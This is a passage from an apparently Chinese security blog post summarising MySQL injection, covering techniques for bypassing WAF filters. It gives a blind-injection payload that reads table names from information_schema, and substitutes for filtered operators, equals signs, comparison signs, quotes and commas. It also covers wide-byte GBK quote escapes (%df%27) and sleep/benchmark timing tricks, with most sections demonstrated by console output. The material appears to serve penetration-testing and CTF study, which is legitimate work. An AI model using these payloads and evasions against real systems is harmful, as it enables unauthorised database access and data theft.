^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
</code></pre>
<h3 id="过滤or-and-xor-not-绕过">过滤or and xor not 绕过</h3>
<pre><code class="language-mysql">and = &amp;&amp;
or = ||
xor = | # 异或
not = !
</code></pre>
<h3 id="过滤等号绕过">过滤等号=绕过</h3>
<ul>
<li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li>
</ul>
<p>正常加上通配符的<code>like</code>：</p>
<pre><code class="language-sql">mysql&gt; select * from users where username like &quot;test%&quot;;
</code></pre>
<p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p>
<pre><code class="language-sql">mysql&gt; select * from users where id like 1;
</code></pre>
<ul>
<li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>
用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id rlike 1;
</code></pre>
<ul>
<li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id regexp 1;
</code></pre>
<ul>
<li>使用大小于号来绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id &gt; 1 and id &lt; 3;
</code></pre>
<ul>
<li>&lt;&gt; 等价于 !=<br>
所以在前面再加一个<code>!</code>结果就是等号了</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where !(id &lt;&gt; 1);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)

</code></pre>
<p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p>
<h3 id="过滤大小于号绕过">过滤大小于号&lt;&gt;绕过</h3>
<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p>
<ul>
<li>greatest(n1, n2, n3…):返回n中的最大值</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
</code></pre>
<ul>
<li>least(n1,n2,n3…):返回n中的最小值</li>
<li>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),116);
Empty set (0.00 sec)
12345678910
</code></pre>
<ul>
<li>in关键字</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('t');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.01 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('y');
Empty set (0.00 sec)
12345678910
</code></pre>
<ul>
<li>between a and b:范围在a-b之间</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id between 1 and 2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
|  2 | user2    | pass1    |
+----+----------+----------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 'b';
Empty set (0.00 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 't';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)
12345678910111213141516171819
</code></pre>
<p>使用between a and b判等</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) between 't' and 't';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
123456
</code></pre>
<h3 id="过滤引号绕过">过滤引号绕过</h3>
<ul>
<li>使用十六进制</li>
</ul>
<pre><code class="language-sql">select column_name  from information_schema.tables where table_name=0x7573657273;
1
</code></pre>
<ul>
<li>宽字节</li>
</ul>
<p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p>
<pre><code class="language-mysql"># 过滤单引号时
%bf%27 %df%27 %aa%27
12
%df\’ = %df%5c%27=縗’
1
</code></pre>
<h3 id="过滤逗号绕过">过滤逗号绕过</h3>
<p>sql盲注时常用到以下的函数：</p>
<pre><code class="language-sql">- substr()
  - substr(string, pos, len):从pos开始，取长度为len的子串
  - substr(string, pos):从pos开始，取到string的最后
  
- substring()
  - 用法和`substr()`一样
  
- mid()
  - 用法和`substr()`一样，但是`mid()`是为了向下兼容`VB6.0`，已经过时，以上的几个函数的pos都是从1开始的
  
- left()和right()
  - left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串
  
- limit
  - limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始
  
- ascii()和char()
  - ascii(char):把char这个字符转为ascii码
  - char(ascii_int):和ascii()的作用相反，将ascii码转字符
</code></pre>
<p>回到正题，如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>
例如在<code>substr()</code>等函数中，常规的写法是</p>
<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot;,1,3);
+----------------------+
| substr(&quot;string&quot;,1,3) |
+----------------------+
| str                  |
+----------------------+
123456
</code></pre>
<ul>
<li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li>
</ul>
<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot; from 1 for 3);
+-------------------------------+
| substr(&quot;string&quot; from 1 for 3) |
+-------------------------------+
| str                           |
+-------------------------------+
1 row in set (0.00 sec)
1234567
</code></pre>
<p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p>
<pre><code>mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;
+----------------------------------------------+
| ascii(substr(database() from 1 for 1)) &gt; 120 |
+----------------------------------------------+
|                                            0 |
+----------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;
+----------------------------------------------+
| ascii(substr(database() from 1 for 1)) &gt; 110 |
+----------------------------------------------+
|                                            1 |
+----------------------------------------------+
1234567891011121314
</code></pre>
<ul>
<li>也可使用<code>join</code>关键字来绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
|  2 | user2    | pass1    |
|  3 | test3    | pass1    |
|  1 | 2        | 3        |
+----+----------+----------+
123456789
</code></pre>
<p>其中的</p>
<pre><code class="language-sql">union select * from (select 1)a join (select 2)b join(select 3)c
</code></pre>
<p>等价于</p>
<pre><code class="language-sql">union select 1,2,3
</code></pre>
<ul>
<li>使用<code>like</code>关键字<br>
适用于<code>substr()</code>等提取子串的函数中的逗号</li>
</ul>
<pre><code class="language-sql">mysql&gt; select ascii(substr(user(),1,1))=114;
+-------------------------------+
| ascii(substr(user(),1,1))=114 |
+-------------------------------+
|                             1 |
+-------------------------------+

mysql&gt; select user() like &quot;r%&quot;;
+------------------+
| user() like &quot;r%&quot; |
+------------------+
|                1 |
+------------------+

mysql&gt; select user() like &quot;t%&quot;;
+------------------+
| user() like &quot;t%&quot; |
+------------------+
|                0 |
+------------------+
1234567891011121314151617181920
</code></pre>
<ul>
<li>使用offset关键字<br>
适用于<code>limit</code>中的逗号被过滤的情况<br>
<code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users limit 2,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | test3    | pass1    |
+----+----------+----------+

mysql&gt; select * from users limit 1 offset 2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | test3    | pass1    |
+----+----------+----------+
12345678910111213
</code></pre>
<h3 id="过滤函数绕过">过滤函数绕过</h3>
<ul>
<li>sleep() --&gt;benchmark()</li>
</ul>
<pre><code class="language-sql">mysql&gt; select 12,23 and sleep(1);
+----+-----------------+
| 12 | 23 and sleep(1) |
+----+-----------------+
| 12 |               0 |
+----+-----------------+
1 row in set (1.00 sec)
1234567
# MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
mysql&gt; select 12,23 and benchmark(1000000000,1);
+----+--------------------------------+
| 12 | 23 and benchmark(1000000000,1) |
+----+--------------------------------+
| 12 |                              0 |
+----+--------------------------------+
1 row in set (4.61 sec)
123456789
</code></pre>
<ul>
<li>ascii()–&gt;hex()、bin()<br>
替代之后再使用对应的进制转string即可</li>
<li>group_concat()–&gt;concat_ws()</li>
</ul>
<pre><code class="language-sql">mysql&gt; select group_concat(&quot;str1&quot;,&quot;str2&quot;);
+-----------------------------+
| group_concat(&quot;str1&quot;,&quot;str2&quot;) |
+-----------------------------+
| str1str2                    |
+-----------------------------+
1 row in set (0.00 sec)

#第一个参数为分隔符
mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);
+------------------------------+
| concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) |
+------------------------------+
| str1,str2                    |
+------------------------------+
123456789101112131415
</code></pre>
<ul>
<li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li>
<li>user() --&gt; @@user、datadir–&gt;@@datadir</li>
<li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li>
</ul>
<h3 id="过滤if函数绕过">过滤IF函数绕过</h3>
<pre><code>case sex  when '1' then '男'  when '2' then '女’  else '其他' end
</code></pre>
<p>https://bbs.ichunqiu.com/thread-60004-1-1.html</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">mySQL注入漏洞总结</a>
<ul>
<li><a href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">联合查询</a></li>
<li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a></li>
<li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">布尔注入</a></li>
<li><a href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5">延时注入</a></li>
<li><a href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5">搜索型注入</a></li>
<li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</a></li>
<li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></li>
<li><a href="#dns%E6%B3%A8%E5%85%A5">DNS注入</a></li>
<li><a href="#insert%E6%B3%A8%E5%85%A5">Insert注入</a></li>
<li><a href="#delete%E6%B3%A8%E5%85%A5">Delete注入</a></li>
<li><a href="#update%E6%B3%A8%E5%85%A5">Update注入</a></li>
</ul>
</li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95">攻击方法</a>
<ul>
<li><a href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5">异或注入</a></li>
<li><a href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">万能密码</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E6%B3%A8%E5%85%A5">利用预编译注入</a></li>
<li><a href="#handler%E6%9F%A5%E8%AF%A2"><strong>handler查询</strong></a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84sql%E6%94%BB%E5%87%BB">基于约束的SQL攻击</a></li>
<li><a href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">无列名注入</a></li>
</ul>
</li>
<li><a href="#%E9%98%B2%E5%BE%A1">防御</a><br>
*
<ul>
<li><a href="#%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E6%AD%A2%E6%B3%A8%E5%85%A5">预编译防止注入</a></li>
<li><a href="#ctf%E9%A2%98%E7%9B%AE">CTF题目</a></li>
<li><a href="#sql%E5%85%A5%E7%BB%95%E8%BF%87">sql入绕过</a>
<ul>
<li><a href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87">关键字绕过</a>
<ul>
<li><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">大小写绕过</a></li>
<li><a href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87">内联注释绕过</a></li>
<li><a href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87">双写关键字绕过</a></li>
<li><a href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">特殊编码绕过</a></li>
<li><a href="#%E7%BB%95%E8%BF%87">&lt;&gt;绕过:</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E6%9B%BF%E6%8D%A2">关键词替换</a>
<ul>
<li><a href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87">注释符号绕过</a></li>
<li><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">空格过滤绕过</a>
<ul>
<li><a href="#%E6%97%A0%E9%9C%80%E7%A9%BA%E6%A0%BC%E6%B3%A8%E5%85%A5">无需空格注入</a></li>
</ul>
</li>
<li><a href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87">过滤or and xor not 绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87">过滤等号=绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87">过滤大小于号&lt;&gt;绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87">过滤引号绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87">过滤逗号绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87">过滤函数绕过</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4if%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87">过滤IF函数绕过</a></li>
</ul>
</li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://Jrand-github.github.io/post/wen-dang-nei-wang-shen-tou/">
              <h3 class="post-title">
                域渗透
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://Jrand-github.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
